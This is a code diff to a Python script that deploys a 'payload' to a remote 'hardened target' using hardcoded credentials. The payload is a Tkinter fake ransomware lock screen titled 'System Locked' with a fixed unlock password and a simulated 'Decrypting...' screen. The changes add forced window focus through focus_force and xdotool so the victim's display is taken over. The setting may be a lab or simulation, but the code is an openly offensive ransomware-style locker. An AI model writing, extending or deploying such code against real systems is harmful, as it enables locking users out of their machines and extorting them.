@@ -10,7 +10,7 @@ PASSWORD = "CEOPass123!"
 def main():
     print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")
 
-    # The Tkinter Payload with Frame switching
+    # The Tkinter Payload with Frame switching and forced focus
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import time
@@ -33,12 +33,20 @@ def show_lock_screen():
 def show_prompt_screen():
     lock_frame.pack_forget()
     prompt_frame.pack(expand=True, fill='both')
+    
+    # Force the window manager to give focus to our application
+    root.focus_force()
     entry.focus_set()
+    
+    # Use xdotool to force the window to become active so we can type
+    try:
+        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowactivate"], check=False)
+    except Exception:
+        pass
 
 def check_password():
     if entry.get() == "Ransomware2026!":
         prompt_frame.pack_forget()
-        # Re-use the lock frame for the decryption progress
         lbl.config(text="Decrypting...")
         lock_frame.pack(expand=True, fill='both')
         root.update()
@@ -48,7 +56,6 @@ def check_password():
             time.sleep(0.2)
         root.destroy()
     else:
-        # Flash red on error
         entry.delete(0, tk.END)
         prompt_frame.configure(bg="darkred")
         prompt_frame.update()
